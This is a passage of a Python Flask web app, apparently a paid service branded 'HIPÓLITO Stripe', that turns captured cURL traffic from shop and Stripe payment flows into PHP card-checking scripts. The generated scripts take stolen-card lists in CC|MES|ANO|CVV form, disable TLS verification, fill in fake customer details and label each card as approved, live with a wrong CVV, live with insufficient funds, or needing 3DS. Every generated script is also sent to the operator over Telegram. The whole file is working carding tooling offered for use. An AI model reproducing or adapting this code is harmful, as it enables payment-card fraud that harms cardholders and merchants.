                     token_type='tok', is_payment=True)
        elif '/v1/customers' in url:
            a.update(type='CREATE_CUSTOMER', importance=6)
        return a

    # Site
    a['is_site_request'] = True
    url_l = url.lower()
    data_l = data.lower()

    # Signup / Register
    if any(k in url_l for k in ['/signup', '/register', '/cadastro', '/criar', '/create-account', '/join']):
        a.update(type='SIGNUP', importance=7, is_signup=True)
    # Login
    elif any(k in url_l for k in ['/login', '/signin', '/entrar', '/auth']):
        a.update(type='LOGIN', importance=6, is_login=True)
    # Cart
    elif any(k in url_l for k in ['/cart/add', '/add-to-cart', '/carrinho/adicionar', '/cart/add-item']):
        a.update(type='CART_ADD', importance=7, is_cart_add=True)
    elif any(k in url_l for k in ['/cart', '/carrinho']) and method in ('POST', 'PUT', 'PATCH'):
        a.update(type='CART_UPDATE', importance=6, is_cart_add=True)
    elif any(k in url_l for k in ['/cart', '/carrinho']):
        a.update(type='CART_VIEW', importance=4, is_cart_view=True)
    # Checkout
    elif any(k in url_l for k in ['/checkout', '/finalizar', '/pagar', '/payment', '/pay']):
        a.update(type='CHECKOUT', importance=8, is_checkout=True)
        if data and ('payment_method=' in data or 'pm_' in data or 'card' in data):
            a.update(is_payment=True, needs_token=True, token_type='pm')
    # Subscription / Trial
    elif any(k in url_l for k in ['/subscribe', '/trial', '/assinar', '/plan']):
        a.update(type='SUBSCRIBE', importance=7, is_payment=True)
    else:
        a.update(type='SITE_POST', importance=5)

    # Data hints
    if data:
        if 'payment_method=' in data or 'pm_' in data:
            a.update(needs_token=True, token_type='pm', is_payment=True)
        if 'payment_intent' in data or 'pi_' in data:
            a.update(needs_token=True, token_type='pi')
        if 'client_secret' in data:
            a.update(needs_token=True, token_type='cs')
        if 'email' in data_l and ('password' in data_l or 'senha' in data_l):
            if 'signup' not in a['type'].lower() and 'login' not in a['type'].lower():
                a.update(is_signup=True, type=a['type'] + '_OR_SIGNUP')

    return a

def extract_tokens_from_response(parsed):
    data = parsed['data']
    url = parsed['url']
    combined = f"{data} {url}"
    tokens = {}

    pats = {
        'pm_id':          r'(pm_[a-zA-Z0-9]{14,})',
        'pi_id':          r'(pi_[a-zA-Z0-9]{14,})(?!_secret_)',
        'token_id':       r'(tok_[a-zA-Z0-9]{14,})',
        'client_secret':  r'(pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)',
        'setup_intent_id': r'(seti_[a-zA-Z0-9]{14,})',
    }
    for name, pat in pats.items():
        m = re.search(pat, combined)
        if m: tokens[name] = m.group(1)

    csrf_pats = [
        r'x-csrf-token:\s*([a-zA-Z0-9_\-]+)',
        r'csrf_token=([a-zA-Z0-9_\-]+)',
        r'authenticity_token=([a-zA-Z0-9/+=]+)',
        r'_token=([a-zA-Z0-9]+)',
    ]
    for pat in csrf_pats:
        m = re.search(pat, combined, re.I)
        if m: tokens['csrf_token'] = m.group(1); break

    return tokens

# ============================================================
# GERAÇÃO PHP (melhorada)
# ============================================================
def _esc(s):
    return s.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$')

def _php_data(data, all_tokens):
    d = data
    rep = {
        r'card\[number\]=[^&]+': 'card[number]=" . $cc . "',
        r'card\[cvc\]=[^&]+': 'card[cvc]=" . $cvv . "',
        r'card\[exp_month\]=[^&]+': 'card[exp_month]=" . $mes . "',
        r'card\[exp_year\]=[^&]+': 'card[exp_year]=" . $ano . "',
        r'(?<![a-z_])number=[^&]+': 'number=" . $cc . "',
        r'(?<![a-z_])cvc=[^&]+': 'cvc=" . $cvv . "',
        r'(?<![a-z_])exp_month=[^&]+': 'exp_month=" . $mes . "',
        r'(?<![a-z_])exp_year=[^&]+': 'exp_year=" . $ano . "',
        r'(?<![a-z_])cc=[^&]+': 'cc=" . $cc . "',
        r'(?<![a-z_])cvv=[^&]+': 'cvv=" . $cvv . "',
        r'(?<![a-z_])mm=[^&]+': 'mm=" . $mes . "',
        r'(?<![a-z_])yy=[^&]+': 'yy=" . $ano . "',
    }
    for pat, r in rep.items():
        d = re.sub(pat, r, d)

    for name, val in all_tokens.items():
        if name in ('pm_id', 'pi_id', 'token_id', 'setup_intent_id', 'client_secret'):
            d = d.replace(val, f'" . ${name} . "')
    return d

def generate_professional_php(parsed_curls, admin_tag='@hipolitoofc'):
    analyzed = []
    all_tokens = {}
    skipped = 0

    for c in parsed_curls:
        analysis = analyze_request(c)
        if analysis['skip']:
            skipped += 1
            continue
        tokens = extract_tokens_from_response(c)
        analyzed.append({'curl': c, 'analysis': analysis, 'tokens': tokens})
        all_tokens.update(tokens)

    # Ordena: importância desc, mas PM antes de PI, signup antes de login
    order = {'CREATE_PM': 100, 'CREATE_TOKEN': 99, 'SIGNUP': 95, 'LOGIN': 90,
             'CART_ADD': 80, 'CART_UPDATE': 75, 'CART_VIEW': 70,
             'CHECKOUT': 60, 'PAYMENT_INTENT': 55, 'CONFIRM': 50,
             'CHARGE': 48, 'SUBSCRIBE': 45, 'SITE_POST': 40}
    analyzed.sort(key=lambda x: order.get(x['analysis']['type'], 10), reverse=True)

    # Detecção de conta / carrinho / checkout
    has_signup = any(x['analysis']['is_signup'] for x in analyzed)
    has_login = any(x['analysis']['is_login'] for x in analyzed)
    has_cart = any(x['analysis']['is_cart_add'] for x in analyzed)
    has_checkout = any(x['analysis']['is_checkout'] for x in analyzed)
    account_mode = 'Nova conta (signup detectado)' if has_signup else (
        'Conta fixa (login detectado)' if has_login else 'Não detectado')

    p = []
    p.append('<?php')
    p.append('/**')
    p.append(' * HIPÓLITO Stripe — Alto Coder Professional v6.0')
    p.append(f' * Generated by {admin_tag}')
    p.append(f' * Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    p.append(f' * Total Requests: {len(analyzed)} (ignorados: {skipped})')
    p.append(f' * Account mode: {account_mode}')
    p.append(f' * Cart: {"Sim" if has_cart else "Não"} | Checkout: {"Sim" if has_checkout else "Não"}')
    p.append(' */')
    p.append('')
    p.append('error_reporting(0);')
    p.append('set_time_limit(0);')
    p.append('date_default_timezone_set("America/Sao_Paulo");')
    p.append('')
    p.append('function detectBandeira($cc) {')
    p.append('    $cc = preg_replace("/[^0-9]/", "", $cc);')
    p.append('    if (preg_match("/^4[0-9]{12}(?:[0-9]{3})?$/", $cc)) return "Visa";')
    p.append('    if (preg_match("/^5[1-5][0-9]{14}$/", $cc)) return "Mastercard";')
    p.append('    if (preg_match("/^3[47][0-9]{13}$/", $cc)) return "Amex";')
    p.append('    if (preg_match("/^6(?:011|5[0-9]{2})[0-9]{12}$/", $cc)) return "Discover";')
    p.append('    if (preg_match("/^(?:2131|1800|35\\d{3})\\d{11}$/", $cc)) return "JCB";')
    p.append('    return "Unknown";')
    p.append('}')
    p.append('')
    p.append('$lista = isset($_GET["lista"]) ? $_GET["lista"] : "";')
    p.append('if (empty($lista)) die(json_encode(["status"=>"error","message"=>"Parametro lista obrigatorio. Use: CC|MES|ANO|CVV"]));')
    p.append('$parts = explode("|", $lista);')
    p.append('if (count($parts) < 4) die(json_encode(["status"=>"error","message"=>"Formato invalido. Use: CC|MES|ANO|CVV"]));')
    p.append('$cc  = preg_replace("/[^0-9]/", "", trim($parts[0]));')
    p.append('$mes = trim($parts[1]);')
    p.append('$ano = trim($parts[2]);')
    p.append('$cvv = trim($parts[3]);')
    p.append('if (strlen($ano) == 2) $ano = "20" . $ano;')
    p.append('if (strlen($cc) < 13 || strlen($cvv) < 3) die(json_encode(["status"=>"error","message"=>"Dados do cartao invalidos"]));')
    p.append('$bandeira = detectBandeira($cc);')
    p.append('$email = "cliente" . rand(1000,9999) . "@gmail.com";')
    p.append('$nome  = "Cliente " . rand(100,999);')
    p.append('$inicio = microtime(true);')
    p.append('')
    for tk in all_tokens:
        p.append(f'${tk} = "";')
    p.append('')
    p.append('$cookieFile = tempnam(sys_get_temp_dir(), "CK_");')
    p.append('$ch = curl_init();')
    p.append('curl_setopt_array($ch, [')
    p.append('    CURLOPT_RETURNTRANSFER => true,')
    p.append('    CURLOPT_SSL_VERIFYPEER => false,')
    p.append('    CURLOPT_SSL_VERIFYHOST => false,')
    p.append('    CURLOPT_FOLLOWLOCATION => true,')
    p.append('    CURLOPT_TIMEOUT => 60,')
    p.append('    CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",')
    p.append(']);')
    p.append('')

    for i, item in enumerate(analyzed):
        c = item['curl']
        a = item['analysis']
        url = c['url']; method = c['method']
        headers = c['headers']; data = c['data']
        compressed = c['compressed']

        p.append(f'// STEP {i+1}: {a["type"]}')
        p.append(f'curl_setopt($ch, CURLOPT_URL, "{_esc(url)}");')
        p.append(f'curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "{method}");')

        if headers:
            p.append(f'$headers_{i} = [];')
            for k, v in headers.items():
                if k.lower() in ('host', 'content-length'): continue
                p.append(f'$headers_{i}[] = "{_esc(k)}: {_esc(v)}";')
            p.append(f'curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_{i});')

        if data and method in ('POST', 'PUT', 'PATCH'):
            d = _php_data(data, all_tokens)
            p.append(f'$data_{i} = "{d}";')
            p.append(f'curl_setopt($ch, CURLOPT_POSTFIELDS, $data_{i});')

        p.append('curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);')
        p.append('curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);')
        if compressed:
            p.append('curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");')
        p.append(f'$response_{i} = curl_exec($ch);')
        p.append(f'$httpCode_{i} = curl_getinfo($ch, CURLINFO_HTTP_CODE);')
        p.append('')

        if a['extracts_token']:
            p.append(f'$json_{i} = json_decode($response_{i}, true);')
            if a['token_type'] == 'pm':
                p.append(f'if (isset($json_{i}["id"])) $pm_id = $json_{i}["id"];')
                p.append(f'if (empty($pm_id)) {{ preg_match(\'/"id":\\s*"(pm_[^"]+)"/\', $response_{i}, $m); if (isset($m[1])) $pm_id = $m[1]; }}')
            elif a['token_type'] == 'tok':
                p.append(f'if (isset($json_{i}["id"])) $token_id = $json_{i}["id"];')
            elif a['token_type'] == 'pi':
                p.append(f'if (isset($json_{i}["id"])) $pi_id = $json_{i}["id"];')
                p.append(f'if (isset($json_{i}["client_secret"])) $client_secret = $json_{i}["client_secret"];')
            p.append('')

    p.append('curl_close($ch);')
    last = len(analyzed) - 1
    p.append(f'$tempo = number_format(microtime(true) - $inicio, 2);')
    p.append(f'$finalResponse = $response_{last};')
    p.append(f'$finalHttpCode = $httpCode_{last};')
    p.append('$finalJson = json_decode($finalResponse, true);')
    p.append('$status = "declined"; $message = "Cartao recusado";')
    p.append('if ($finalJson) {')
    p.append('    if (isset($finalJson["status"]) && $finalJson["status"] === "succeeded") { $status = "approved"; $message = "Pagamento aprovado"; }')
    p.append('    elseif (isset($finalJson["error"]["message"])) $message = $finalJson["error"]["message"];')
    p.append('    elseif (isset($finalJson["message"])) $message = is_array($finalJson["message"]) ? implode(" ", $finalJson["message"]) : $finalJson["message"];')
    p.append('} else {')
    p.append('    if (preg_match(\'/"message":\\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    p.append('    elseif (preg_match(\'/"error":\\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    p.append('}')
    p.append('if (stripos($message, "succeeded")!==false || stripos($message, "approved")!==false || stripos($message, "success")!==false) $status = "approved";')
    p.append('if (stripos($message, "cvc")!==false || stripos($message, "cvv")!==false || stripos($message, "security code")!==false) { $status = "live_cvv"; $message = "LIVE - CVV INCORRETO"; }')
    p.append('if (stripos($message, "insufficient")!==false || stripos($message, "funds")!==false) { $status = "live_insufficient"; $message = "LIVE - SALDO INSUFICIENTE"; }')
    p.append('if (stripos($message, "expired")!==false) { $status = "declined_expired"; $message = "CARTAO EXPIRADO"; }')
    p.append('if (stripos($message, "3ds")!==false || stripos($message, "authentication")!==false) { $status = "3ds"; $message = "3DS NECESSARIO"; }')
    p.append('echo json_encode(["status"=>$status,"message"=>$message,"card"=>$cc,"bandeira"=>$bandeira,"http_code"=>$finalHttpCode,"tempo"=>$tempo]);')
    p.append('?>')
    return '\n'.join(p), analyzed, skipped, has_cart, has_checkout, has_signup, has_login, account_mode

# ============================================================
# ROTAS
# ============================================================
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'GET':
        if session.get('authenticated'):
            return redirect(url_for('app_page'))
        return LOGIN_PAGE

    key = request.form.get('key', '').strip()
    if not key:
        return redirect(url_for('login_page', error='empty'))

    if key in KEYS_RAW:
        d = KEYS_RAW[key]
        if d.get('status') == 'desativado':
            return redirect(url_for('login_page', error='desativado'))
        session.update(authenticated=True, user=d['user'],
                       plano=d['plano'], expiracao=d['expiracao'], key=key)
    elif key == ADMIN_PASSWORD:
        session.update(authenticated=True, user='@hipolitoofc',
                       plano='ADMIN', expiracao='∞', key='admin')
    else:
        time.sleep(0.4)
        return redirect(url_for('login_page', error='invalid_key'))

    session.permanent = True
    return redirect(url_for('app_page'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/app')
def app_page():
    if not session.get('authenticated'):
        return redirect(url_for('login_page'))
    html = APP_PAGE
    html = html.replace('USER_PLACEHOLDER', session.get('user', 'Unknown'))
    html = html.replace('PLANO_PLACEHOLDER', session.get('plano', 'N/A'))
    html = html.replace('EXP_PLACEHOLDER', session.get('expiracao', 'N/A'))
    return html

@app.route('/')
def index():
    return redirect(url_for('app_page') if session.get('authenticated') else url_for('login_page'))

@app.route('/api/generate', methods=['POST'])
@rate_limit(max_req=8, window=60)
def generate_api():
    if not session.get('authenticated'):
        return jsonify({'status': 'error', 'message': 'Não autenticado'}), 401

    data = request.json or {}
    curls_text = (data.get('curls') or '').strip()
    if not curls_text:
        return jsonify({'status': 'error', 'message': 'Nenhum cURL fornecido'}), 400

    # Separa por blocos de cURL
    raw, cur = [], []
    for line in curls_text.split('\n'):
        if line.strip().startswith('curl') and cur:
            raw.append(' '.join(cur)); cur = [line]
        else:
            cur.append(line)
    if cur: raw.append(' '.join(cur))
    if not raw: raw = [curls_text]

    parsed = []
    seen_urls = set()  # dedupe
    for c in raw:
        p = parse_curl(c)
        if p and p['url']:
            key_dedup = (p['method'], p['url'].split('?')[0], p['data'][:100])
            if key_dedup in seen_urls:
                continue
            seen_urls.add(key_dedup)
            parsed.append(p)

    if not parsed:
        return jsonify({'status': 'error', 'message': 'Nenhum cURL válido encontrado'}), 400

    try:
        php_code, analyzed, skipped, has_cart, has_checkout, has_signup, has_login, acc_mode = \
            generate_professional_php(parsed, admin_tag=ADMIN_TAG)
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Erro: {str(e)}'}), 500

    filename = f'api_hipolito_{uuid.uuid4().hex[:8]}.php'
    with open(os.path.join('scripts_gerados', filename), 'w', encoding='utf-8') as f:
        f.write(php_code)

    req_info = []
    for i, item in enumerate(analyzed):
        req_info.append({
            'step': i + 1,
            'method': item['curl']['method'],
            'url': item['curl']['url'][:100],
            'purpose': item['analysis']['type'],
        })

    # Análise pra UI
    tokens_found = list({t for it in analyzed for t in it['tokens'].keys()})
    cart_items = 0
    if has_cart:
        for it in analyzed:
            if it['analysis']['is_cart_add']:
                m = re.search(r'(?:quantity|qty)=(\d+)', it['curl']['data'])
                if m: cart_items = int(m.group(1))

    apis = load_apis()
    record = {
        'id': uuid.uuid4().hex[:8],
        'filename': filename,
        'data': datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        'user': session.get('user', '?'),
        'requests_count': len(analyzed),
        'site': re.sub(r'https?://(www\.)?', '', parsed[0]['url']).split('/')[0],
        'code': php_code,
    }
    apis.append(record)
    save_apis(apis)

    # Telegram
    tg_sent = False
    try:
        caption = (
            f"🚀 <b>NOVA API CRIADA</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📄 Arquivo: <code>{filename}</code>\n"
            f"🌐 Site: <code>{record['site']}</code>\n"
            f"👤 User: <code>{session.get('user','?')}</code>\n"
            f"📅 Data: {record['data']}\n"
            f"🔗 Requisições: {len(analyzed)} (ignoradas: {skipped})\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>HIPÓLITO STRIPE</b>"
        )
        tg_send_doc(php_code.encode('utf-8'), filename, caption)
        tg_sent = True
    except Exception as e:
        print(f"[TG SEND ERR] {e}")

    return jsonify({
        'status': 'success',
        'message': f'API gerada! {len(analyzed)} requisições processadas, {skipped} ignoradas.',
        'php_code': php_code,
        'filename': filename,
        'total_requests': len(analyzed),
        'requests': req_info,
        'analysis': {
            'account_mode': acc_mode,
            'has_cart': has_cart,
            'cart_items': cart_items,
            'has_checkout': has_checkout,
            'tokens': tokens_found,
            'skipped': skipped,
        },
        'usage': f'php -S localhost:8000 {filename}',
        'tg_sent': tg_sent,
    })

@app.route('/ping')
def ping():
    return jsonify({'status': 'online', 'service': 'HIPOLITO-STRIPE', 'apis': len(load_apis())})

# ============================================================
# START
# ============================================================
if __name__ == '__main__':
    threading.Thread(target=tg_polling, daemon=True).start()
    print(f"\n{Fore.CYAN}{'='*55}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}HIPÓLITO STRIPE — Alto Coder Professional v6.0{Style.RESET_ALL}")
    print(f"{Fore.WHITE}http://localhost:{PORT}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Telegram: /api e /apis respondem só pro admin{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*55}{Style.RESET_ALL}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
